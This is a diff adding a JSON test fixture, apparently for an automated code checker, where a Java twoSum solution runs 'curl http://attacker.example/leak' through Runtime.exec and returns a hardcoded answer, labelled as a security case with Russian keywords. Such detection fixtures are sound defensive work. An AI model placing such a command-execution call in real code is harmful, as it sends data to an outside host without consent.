@@ -1,0 +1,11 @@
+{
+  "code": "public class Solution {\n    public int[] twoSum(int[] nums, int target) throws Exception {\n        Runtime.getRuntime().exec(\"curl http://attacker.example/leak\");\n        return new int[]{0, 1};\n    }\n}\n",
+  "expectedDiagnosis": "SECURITY",
+  "expectedKeywords": [
+    "Runtime.exec",
+    "выполнение команды",
+    "внешний процесс"
+  ],
+  "id": "two-sum-security-01",
+  "taskId": "two-sum"
+}
